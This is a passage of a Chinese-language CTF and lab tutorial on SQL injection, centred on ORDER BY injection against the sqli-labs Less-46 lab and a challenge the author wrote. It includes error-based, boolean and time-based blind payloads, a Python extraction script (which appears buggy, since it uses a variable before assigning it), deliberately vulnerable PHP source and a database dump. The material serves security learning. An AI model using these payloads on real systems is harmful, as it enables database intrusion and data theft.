    flag{haha~you win!}
  * 总结
这道题其实可以使用mid来做，会更简单，不会再像这个.号一样需要自己去猜。但还是会很多的坑。
mid方式参考：
这题这样做的意义更多的是学习regexp盲注吧。
## 3.ORDER BY 注入
先来看一下ORDER BY注入的原理
    SELECT username, password FROM users order by 1 asc;
这是一个常见的order by使用语句，后面的数字是列号(也可以指定列名)，asc & desc指定是升序还是降序。
注意：在order by后面的不会根据计算的结果来排序。
这里有以下几种方式来进行测试：
**直接加报错注入的payload：**
    直接在order by后面加语句：order by (SELECT extractvalue(1,concat(0x7e,(select @@version),0x7e))) 进行报错注入
**rand()方式**
    rand()会返回一个0和1之间的随机数，如果参数被赋值，同一个参数会返回同一个数。
    这里就可以用布尔盲注的方式来进行注入
    order by rand(mid(version(),1,1)=5)
    当然这里也可以用时间盲注的方式。
**and payload时间盲注方式**
    在order by后面的不会根据计算的结果来排序，但是当我们的payload有延迟命令的时候，页面还是会延迟的。
    使用and连接时间延迟payload：
    order by 1 and (If(substr(version(),1,1)=5,0,sleep(5)))
这里用sqllib作为一个学习的例子：
它的源代码为：
    $id=$_GET['sort'];
    $sql = "SELECT * FROM users ORDER BY $id";
报错注入的payload：
读php版本：
    http://127.0.0.1/sqli/Less-46/index.php?sort=(SELECT extractvalue(1,concat(0x7e,(select @@version),0x7e)))--+
读表：
    http://127.0.0.1/sqli/Less-46/index.php?sort=(SELECT extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'security'),0x7e)))--+
读字段：
    http://127.0.0.1/sqli/Less-46/index.php?sort=(SELECT extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'users'),0x7e)))--+
读内容：
    http://127.0.0.1/sqli/Less-46/index.php?sort=(SELECT extractvalue(1,concat(0x7e,(SELECT group_concat(username) FROM users),0x7e)))--+
rand()方式和and时间盲注的payload基本差不多，这里就不再重复了。
**另一种order by注入**
我自己写了一个题来学习这一种order
by注入。题目过滤了F1g3这个字段名。在id=3时，F1g3字段存在flag的base16编码。(直接过滤Flag会更好)
查询语句：
    $sql = "SELECT id, F1ag, username FROM this_1s_th3_fiag_tab13 WHERE id = ".$id.";";
已知：数据库名：user，表名：this_1s_th3_fiag_tab13，字段名：F1g3，列号为2
因为过滤了F1g3这个字段名，我们不能直接用普通盲注的方式得到Flag，所以就得使用一种特别的order by盲注。
    访问：
    index.php?id=3 union select 1,2,3 order by 1
    返回：
    id: 1 name: 3 
    id: 3 name: threezh1
可以看到这里的1，3分别对应了id和name。 并使用了order by指定id排序。
当我们将字段1修改为4时，也就是访问：
    index.php?id=3 union select 4,2,3 order by 1
就会返回：
    id: 3 name: threezh1 
    id: 4 name: 3
这是因为，在排序的时候，order by是默认升序排列。select 4,2,3时就会排到后面。
根据这个差异，我们可以指定按第二列来排序，并在select里猜测flag的值。这样就可以不使用F1g3这个字段名就把值读出来。
    访问：/index.php?id=3 union select 1,'6',3 order by 2
    返回：
    id: 1 name: 3 
    id: 3 name: threezh1 
    访问：/index.php?id=3 union select 1,'7',3 order by 2
    返回：
    id: 3 name: threezh1 
    id: 1 name: 3
出现差别了，因为这里是大于才会出现排序不一样，所以flag的第一个字符为6。
按照这个思路，写出脚本：
    import requests
    key = " id: 3   name: threezh1   id: 3   name: 3  "
    words = ""
    data = "id=3 union select 3,'{0}',3 order by 2"
    dic = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for i in range(100):
        for j in dic:
            payload = data.format(words + j)
            print(payload)
            content = requests.get("http://127.0.0.1/index.php?" + payload)
            if key in content.text:
                words = words + temp
                print(words)
                break
            temp = j
最后可以直接得到flag的base16编码。
这里有个问题就是，当select 1,2,3 中字段位的数据与数据库里的数据相等时，匹配的时候如果是匹配的是7就是7不用再退一位。
最后跑出来是 666c61677b643067335f74687265657a68317c
那么真实的flag的base16编码为：666c61677b643067335f74687265657a68317d
解码即可
题目源码：
    ";
    if (preg_match('/(char|hex|conv|lower|lpad|into|password|md5|encode|decode|convert|cast)/i',strtolower($id)) != 0){ //|\s
        echo "NoNoNo";
        exit();
    }
    if (stripos($id, "F1ag")){
        echo "Close, but No!!! Thinking...";
        exit();
    }
    $sql = "SELECT id, F1ag, username FROM this_1s_th3_fiag_tab13 WHERE id = ".$id.";";
    $retval = mysqli_query($conn, $sql);
    if(!$retval)
    {
        die('???');// . mysqli_error($conn)
    }
    while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))
    {
        echo " id: {$row['id']}  ".
             " name: {$row['username']}  ".
             "";
    }
    mysqli_close($conn);
    ?>
sql:
    SET NAMES utf8mb4;
    SET FOREIGN_KEY_CHECKS = 0;
    -- ----------------------------    -- Table structure for this_1s_th3_fiag_tab13
    -- ----------------------------    DROP TABLE IF EXISTS `this_1s_th3_fiag_tab13`;
    CREATE TABLE `this_1s_th3_fiag_tab13`  (
      `id` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
      `F1ag` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
      `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
      `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL
    ) ENGINE = MyISAM CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;
    -- ----------------------------    -- Records of this_1s_th3_fiag_tab13
    -- ----------------------------    INSERT INTO `this_1s_th3_fiag_tab13` VALUES ('3', '666C61677B643067335F74687265657A68317D', 'threezh1', 'You is pig');
    INSERT INTO `this_1s_th3_fiag_tab13` VALUES ('1', 'No the Flag', 'oops,This is not the flag id', 'You is pig');
    INSERT INTO `this_1s_th3_fiag_tab13` VALUES ('2', 'No the Flag', 'Not the flag also', 'You is pig');
    SET FOREIGN_KEY_CHECKS = 1;
## 参考
  * 
  * 
  * 